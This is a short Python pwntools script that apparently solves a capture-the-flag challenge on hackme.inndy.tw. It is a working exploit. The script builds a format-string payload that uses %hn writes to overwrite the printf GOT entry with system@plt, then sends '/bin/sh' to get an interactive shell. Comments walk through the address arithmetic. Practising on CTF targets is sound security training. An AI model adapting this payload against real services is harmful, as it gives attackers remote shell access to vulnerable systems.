from pwn import *

#r = remote("localhost", 5566)
r = remote("hackme.inndy.tw", 7711)

# 0x804a0 10    12
#         8406  0804 
#         33798 2052

# Make 0x0804a010 (printf) --> 08048406 (system@plt)
payload = '\x12\xa0\x04\x08'    # 4 Bytes
payload += "AAAA"               # 4 Bytes
payload += '\x10\xa0\x04\x08'   # 4 Bytes
payload += "%x%x%x%x%x"         # Total ? Bytes
payload += "%2013x"

payload += "%hn"
payload += "%31746x"
payload += "%hn"

# Next printf is actually system@plt
# And fgets restore input in eax
# And There is a instruction "push eax" before printf 
# So, Next input we can send "/bin/sh" and system@plt will execute it.

payload2 = "/bin/sh"

r.sendline(payload)
r.sendline(payload2)

r.interactive()
